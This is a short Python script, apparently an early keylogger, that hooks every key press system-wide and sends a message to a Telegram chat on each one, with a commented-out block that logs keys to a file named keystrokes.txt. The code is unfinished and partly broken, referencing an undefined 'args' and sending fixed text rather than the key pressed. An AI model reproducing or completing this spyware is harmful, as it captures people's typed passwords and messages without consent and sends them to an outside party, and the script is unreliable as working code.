import keyboard
import logging
import threading

from utils import setup_logging
from telegram.client import Telegram

log_file = 'keystrokes.txt'

try:
    tg = Telegram(
            api_id="",
            api_hash="",
            phone="",
            database_encryption_key="changeme1234",
        )
    def on_key_press(event):
        # with open(log_file, 'a') as f:
        #     f.write('{}\n'.format(event.name))

        send_message_result = tg.send_message(
            chat_id=args.chat_id,
            text=args.text,
        )
        send_message_result.wait()

        if send_message_result.error:
            print(f"Failed to send the message: {send_message_result.error_info}")

    keyboard.on_press(on_key_press)

    keyboard.wait()

except KeyboardInterrupt:
    print('Exiting...')